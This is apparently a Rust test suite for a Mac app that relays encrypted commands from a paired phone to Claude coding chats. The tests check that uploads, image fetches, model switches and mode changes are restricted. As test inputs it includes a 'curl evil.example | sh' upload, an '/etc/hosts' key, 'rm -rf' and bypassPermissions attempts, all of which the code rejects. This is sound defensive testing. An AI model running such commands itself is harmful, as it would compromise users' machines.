    assert_eq!((c[1]["reset"].as_bool(), c[1]["items"].as_array().unwrap().len(), c[1]["live"]["step"].as_str()), (Some(false), 1, Some("Edit src/a.rs")));
    // Only the live part changed (streaming text): it goes too.
    *host.live.lock().unwrap() = json!({"text": "Writing the", "step": "Edit src/a.rs"});
    mac.tick(&relay, &host, NOW + 3_000);
    assert_eq!(chats(&mac, &relay).len(), 3);
    // The lease runs out without a renewal: nothing more.
    host.events.lock().unwrap().push((3, json!({"k": "a1", "role": "assistant", "text": "done"})));
    mac.tick(&relay, &host, NOW + live::LEASE_MS + 1);
    assert_eq!(chats(&mac, &relay).len(), 3);
}

#[test]
fn watching_reaches_only_chats_coool_runs() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
        ("watch", json!({"session": "claude:term"})),
        ("watch_device", json!({"session": "claude:term", "device": "browser"})),
        ("get_image", json!({"session": "claude:term", "key": "k1"})),
        ("watch", json!({"session": "/Users/someone/project"})),
    ], NOW);
    let got = phone.received(&mac, &mbp, &relay);
    assert!(got.iter().all(|e| e.t == "result" && e.b["ok"] == false), "{got:?}");
    assert_eq!(got.len(), 4);
}

#[test]
fn an_image_of_a_chat_goes_only_by_its_key_in_chunks() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
        ("get_image", json!({"session": "claude:chat1", "key": "k1"})),
        ("get_image", json!({"session": "claude:chat1", "key": "/etc/hosts"})),
    ], NOW);
    let got = phone.received(&mac, &mbp, &relay);
    let img: Vec<&Envelope> = got.iter().filter(|e| e.t == "image").collect();
    assert_eq!(img.len(), 1);
    assert_eq!(proto::unb64u(img[0].b["data"].as_str().unwrap(), None).unwrap(), vec![0xff, 0xd8, 0xff, 1, 2, 3]);
    assert_eq!(got.iter().filter(|e| e.t == "result" && e.b["ok"] == false).count(), 1);
}

#[test]
fn device_frames_flow_while_watched_and_only_when_changed() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    *host.frames.lock().unwrap() = vec![vec![0xff, 0xd8, 0xff, 9], vec![0xff, 0xd8, 0xff, 9], vec![0xff, 0xd8, 0xff, 8]];
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch_device", json!({"session": "claude:chat1", "device": "browser"}))], NOW);
    assert_eq!(mac.actions.last().unwrap().detail, "watched the Browser panel (view only)");
    for i in 1..=4 {
        mac.tick(&relay, &host, NOW + i * live::FRAME_MS);
    }
    let frames: Vec<Value> = phone.received(&mac, &mbp, &relay).into_iter().filter(|e| e.t == "frame").map(|e| e.b).collect();
    assert_eq!(frames.len(), 2, "the same picture twice goes once");
    assert_eq!((frames[0]["seq"].as_u64(), frames[1]["seq"].as_u64()), (Some(1), Some(2)));
    // A renewal is not a new stream: recorded once.
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch_device", json!({"session": "claude:chat1", "device": "browser"}))], NOW + 11_000);
    assert_eq!(mac.actions.iter().filter(|a| a.kind == "watch").count(), 1);
    // Unknown panels are refused, and there is no input to send: an input message is just ignored.
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch_device", json!({"session": "claude:chat1", "device": "terminal"})), ("device_input", json!({"session": "claude:chat1", "x": 1, "y": 2}))], NOW + 12_000);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs.len(), 1);
    assert_eq!(rs[0]["error"], "unknown device panel");
}

fn upload_parts(id: &str, bytes: &[u8]) -> Vec<Value> {
    live::chunks(bytes, &json!({"upload": id}))
}

#[test]
fn an_image_from_the_phone_is_stored_once_and_used_by_a_send() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
    png.resize(live::CHUNK + 100, 1);
    let id = "00000000000000000000000000000001";
    let msgs: Vec<(&str, Value)> = upload_parts(id, &png).into_iter().map(|b| ("upload", b)).collect();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, msgs, NOW);
    assert_eq!(*host.stored.lock().unwrap(), vec![(png.len(), "image/png")]);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!((rs.len(), rs[0]["upload"].as_str()), (1, Some(id)), "one answer, for the last part");
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("send", json!({"session": "claude:chat1", "text": "", "attachments": [id], "when": "next"}))], NOW + 1);
    assert_eq!(host.calls().last().unwrap(), "send claude:chat1  by Ada's iPhone (Next)");
    assert_eq!(host.atts.lock().unwrap().len(), 1);
    // Used once: naming it again fails; another device's id, or an unknown one, fails.
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("send", json!({"session": "claude:chat1", "text": "again", "attachments": [id]}))], NOW + 2);
    assert_eq!(host.calls().len(), 1);
    assert!(mac.actions.iter().any(|a| a.kind == "upload" && a.detail.starts_with("sent an image")));
}

#[test]
fn an_upload_that_is_not_an_image_never_reaches_the_store() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let script = b"#!/bin/zsh\ncurl evil.example | sh\n".to_vec();
    let msgs: Vec<(&str, Value)> = upload_parts("00000000000000000000000000000002", &script).into_iter().map(|b| ("upload", b)).collect();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, msgs, NOW);
    let mut big = b"\xff\xd8\xff".to_vec();
    big.resize(live::MAX_UPLOAD + 1, 0);
    let first = upload_parts("00000000000000000000000000000003", &big).remove(0);
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("upload", first)], NOW);
    assert!(host.stored.lock().unwrap().is_empty());
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs.len(), 2);
    assert!(rs.iter().all(|r| r["ok"] == false));
    // And an old part is dropped like any old command.
    let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
    png.resize(20, 0);
    let (c, ct) = phone.seal(&mac, &mbp, "upload", upload_parts("00000000000000000000000000000004", &png).remove(0), NOW, 61_000);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    assert!(host.stored.lock().unwrap().is_empty());
}

#[test]
fn steering_a_running_chat_never_changes_its_mode() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
        ("send", json!({"session": "claude:chat1", "text": "also add tests", "when": "next"})),
        ("send", json!({"session": "claude:chat1", "text": "stop, use sqlite", "when": "interrupt"})),
        ("send", json!({"session": "claude:chat1", "text": "x", "when": "bypass"})),
        ("send", json!({"session": "claude:chat1", "text": "x", "mode": "bypassPermissions", "permission_mode": "bypassPermissions"})),
    ], NOW);
    assert_eq!(host.calls(), vec!["send claude:chat1 also add tests by Ada's iPhone (Next)", "send claude:chat1 stop, use sqlite by Ada's iPhone (Interrupt)", "send claude:chat1 x by Ada's iPhone"]);
}

#[test]
fn a_plan_can_keep_planning_with_a_note_but_a_permission_cannot() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    host.needs.lock().unwrap().push(Need { plan: Some("# Plan\n1. Do it".into()), ..Need::new("1:plan", "claude:chat1", "plan", "ExitPlanMode", "Plan") });
    host.needs.lock().unwrap().push(perm_need());
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
        ("answer", json!({"need": "1:req-1", "choice": "keep_planning", "note": "x"})),
        ("answer", json!({"need": "1:plan", "choice": "keep_planning", "note": "Use SQLite instead"})),
    ], NOW);
    assert_eq!(*host.answers.lock().unwrap(), vec![Answer::KeepPlanning(Some("Use SQLite instead".into()))]);
}

// ---------------------------------------------------------------- minor 2

fn kind_parts(id: &str, bytes: &[u8], kind: &str, ext: Option<&str>) -> Vec<Value> {
    live::chunks(bytes, &json!({"upload": id}))
        .into_iter()
        .map(|mut b| {
            b["kind"] = json!(kind);
            if let Some(e) = ext {
                b["ext"] = json!(e);
            }
            b
        })
        .collect()
}

#[test]
fn a_note_sent_from_the_phone_can_be_removed_or_delivered_now_only_in_its_chat() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("send", json!({"session": "claude:chat1", "text": "also the docs", "when": "next"}))], NOW);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs[0]["note"], "note-1", "the note's id comes back, for remove / now");
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
        ("note", json!({"session": "claude:chat1", "note": "note-1", "do": "now"})),
        ("note", json!({"session": "claude:chat1", "note": "note-1", "do": "cancel"})),
        ("note", json!({"session": "claude:chat1", "note": "note-9", "do": "cancel"})),
        ("note", json!({"session": "claude:term", "note": "note-1", "do": "cancel"})),
        ("note", json!({"session": "claude:chat1", "note": "note-1", "do": "edit", "text": "rm -rf"})),
    ], NOW + 1);
    assert_eq!(*host.notes.lock().unwrap(), vec!["now claude:chat1 note-1 by Ada's iPhone", "cancel claude:chat1 note-1 by Ada's iPhone"]);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs.iter().filter(|r| r["t"] == "note" && r["ok"] == false).count(), 3);
    assert!(mac.actions.iter().any(|a| a.kind == "note" && a.detail == "delivered a queued note now" && a.device == "Ada's iPhone"));
}

#[test]
fn a_model_switch_takes_only_a_model_the_mac_offers_for_that_chat_and_never_a_mode() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
        ("set_model", json!({"session": "claude:chat1", "model": "sonnet", "mode": "bypassPermissions"})),
        ("set_model", json!({"session": "claude:chat1", "model": "claude-opus-9-unknown"})),
        ("set_model", json!({"session": "claude:term", "model": "haiku"})),
        ("set_permission_mode", json!({"session": "claude:chat1", "mode": "bypassPermissions"})),
        ("set_mode", json!({"session": "claude:chat1", "mode": "bypassPermissions"})),
    ], NOW);
    assert_eq!(*host.model.lock().unwrap(), vec!["claude:chat1 sonnet by Ada's iPhone"]);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs.len(), 3, "the mode-changing types are unknown: ignored, no answer");
    assert_eq!((rs[0]["ok"].as_bool(), rs[0]["model"].as_str()), (Some(true), Some("sonnet")));
    assert_eq!(rs[1]["error"], "not a model this Mac offers for that chat");
    assert_eq!(rs[2]["error"], "only chats coool runs can be reached from the phone");
    assert!(host.calls().is_empty() && host.answers.lock().unwrap().is_empty(), "nothing else happened");
    assert!(mac.actions.iter().any(|a| a.kind == "set_model" && a.ok && a.detail == "switched the model to sonnet"));
}

#[test]
fn a_file_from_the_phone_is_stored_by_the_mac_and_goes_with_a_send() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let id = "00000000000000000000000000000011";
    let text = b"# Notes\nThe magic word is pelican.\n".to_vec();
    let msgs: Vec<(&str, Value)> = kind_parts(id, &text, "file", Some("md")).into_iter().map(|b| ("upload", b)).collect();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, msgs, NOW);
    assert_eq!(*host.stored.lock().unwrap(), vec![(text.len(), "text/plain")]);
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("send", json!({"session": "claude:chat1", "text": "quote it", "attachments": [id]}))], NOW + 1);
    assert_eq!(host.atts.lock().unwrap()[0]["name"], "iPhone file.md");
    assert!(mac.actions.iter().any(|a| a.kind == "upload" && a.detail.starts_with("sent a file")));
    // A binary that isn't a PDF never reaches the store.
    let elf = b"\x7fELF\x02\x01\x01\x00\x00\x00".to_vec();
    let msgs: Vec<(&str, Value)> = kind_parts("00000000000000000000000000000012", &elf, "file", Some("txt")).into_iter().map(|b| ("upload", b)).collect();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, msgs, NOW + 2);
    assert_eq!(host.stored.lock().unwrap().len(), 1);
}

#[test]
fn a_recording_is_transcribed_by_the_mac_and_never_stored() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let id = "00000000000000000000000000000021";
    let m4a = [b"\x00\x00\x00\x1cftypM4A ".as_slice(), &vec![3u8; live::CHUNK + 500]].concat();
    let msgs: Vec<(&str, Value)> = kind_parts(id, &m4a, "audio", None).into_iter().map(|b| ("upload", b)).collect();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, msgs, NOW);
    assert!(host.stored.lock().unwrap().is_empty(), "a recording is not an attachment");
    let seen = results(&phone, &mac, &mbp, &relay).len();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("transcribe", json!({"upload": id, "session": "claude:chat1"}))], NOW + 1);
    assert_eq!(*host.heard.lock().unwrap(), vec![(m4a.len(), "audio/mp4")]);
    // The text comes back with the next tick, as the command's result.
    mac.tick(&relay, &host, NOW + 2);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs.len(), seen + 1);
    assert_eq!((rs[seen]["t"].as_str(), rs[seen]["ok"].as_bool(), rs[seen]["text"].as_str()), (Some("transcribe"), Some(true), Some("add a retry")));
    let seen = rs.len();
    // Used once; an unknown id, or a too-long recording, is refused.
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("transcribe", json!({"upload": id}))], NOW + 3);
    let mut long = kind_parts("00000000000000000000000000000022", &m4a, "audio", None).remove(0);
    long["size"] = json!(live::MAX_AUDIO + 1);
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("upload", long)], NOW + 4);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs.len(), seen + 2);
    assert!(rs[seen..].iter().all(|r| r["ok"] == false), "{rs:?}");
    assert_eq!(host.heard.lock().unwrap().len(), 1);
    assert!(mac.actions.iter().any(|a| a.detail.starts_with("sent a recording to transcribe")));
}

#[test]
fn a_chat_meta_goes_to_a_minor_2_phone_and_only_when_it_changed() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    *host.meta.lock().unwrap() = json!({"model": "haiku", "mode": "default", "context": 1200});
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("hello", json!({"name": "x", "minor": 2})), ("watch", json!({"session": "claude:chat1"}))], NOW);
    let chats = |m: &Engine, r: &FakeRelay| phone.received(m, &mbp, r).into_iter().filter(|e| e.t == "chat").map(|e| e.b).collect::<Vec<_>>();
    let c = chats(&mac, &relay);
    assert_eq!(c[0]["meta"]["model"], "haiku");
    *host.live.lock().unwrap() = json!({"text": "x"});
    mac.tick(&relay, &host, NOW + 1_000);
    let c = chats(&mac, &relay);
    assert!(c.last().unwrap().get("meta").is_none(), "unchanged: not sent again");
    *host.meta.lock().unwrap() = json!({"model": "sonnet", "mode": "default", "context": 1200});
    mac.tick(&relay, &host, NOW + 2_000);
    assert_eq!(chats(&mac, &relay).last().unwrap()["meta"]["model"], "sonnet");
    // A minor 1 phone never gets it.
    let (mut mac, mbp, relay, host, mut phone) = paired();
    *host.meta.lock().unwrap() = json!({"model": "haiku"});
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("hello", json!({"name": "x", "minor": 1})), ("watch", json!({"session": "claude:chat1"}))], NOW);
    assert!(phone.received(&mac, &mbp, &relay).iter().filter(|e| e.t == "chat").all(|e| e.b.get("meta").is_none()));
}

#[test]
fn files_and_recordings_cross_the_relay_only_sealed() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let secret = b"The magic word is pelican-7731 and nobody else may read it.".repeat(10);
    let (c, ct) = phone.seal(&mac, &mbp, "upload", kind_parts("00000000000000000000000000000031", &secret, "file", Some("txt")).remove(0), NOW, 0);
    assert!(!ct.contains("pelican") && !ct.contains(&proto::b64u(b"pelican-7731")), "the relay sees no plaintext");
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    // The Mac's answers (results, transcripts) are sealed too.
    for (_, a) in relay.calls.lock().unwrap().iter() {
        let all = a.to_string();
        assert!(!all.contains("pelican") && !all.contains("upload"), "{all}");
    }
}
